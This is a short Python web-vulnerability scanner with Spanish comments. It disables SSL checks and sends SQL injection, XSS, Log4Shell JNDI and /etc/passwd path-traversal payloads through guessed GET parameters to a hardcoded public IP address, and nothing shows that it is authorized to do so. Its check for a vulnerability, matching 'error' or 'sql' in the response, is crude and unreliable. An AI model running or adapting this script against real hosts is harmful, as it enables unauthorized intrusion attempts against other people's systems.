import requests
import urllib3

# Desactivar advertencias SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def test_basic_injections(url):
    """Prueba inyecciones básicas"""
    print(f"[*] Probando inyecciones básicas en: {url}")
    
    # Payloads de prueba
    payloads = [
        "' OR '1'='1",
        "' OR 1=1--",
        "admin'--",
        "' UNION SELECT 1,2,3--",
        "<script>alert('XSS')</script>",
        "${jndi:ldap://test}",
        "../../../etc/passwd"
    ]
    
    try:
        # Probar en parámetros GET si los hay
        if '?' in url:
            base_url, params = url.split('?', 1)
            # Aquí podrías probar cada parámetro con los payloads
            print("[*] La URL tiene parámetros, sería necesario analizarlos")
        else:
            # Probar añadiendo parámetros comunes
            test_params = ['id', 'user', 'name', 'file', 'page']
            
            for param in test_params:
                for payload in payloads:
                    test_url = f"{url}?{param}={payload}"
                    try:
                        response = requests.get(test_url, verify=False, timeout=5)
                        # Analizar respuesta para detectar vulnerabilidades
                        if "error" in response.text.lower() or "sql" in response.text.lower():
                            print(f"[!] Posible vulnerabilidad en parámetro {param}: {payload}")
                    except:
                        pass
                        
    except Exception as e:
        print(f"[-] Error en pruebas de inyección: {e}")

# Ejecutar pruebas
if __name__ == "__main__":
    target_url = "http://189.254.143.102"
    test_basic_injections(target_url)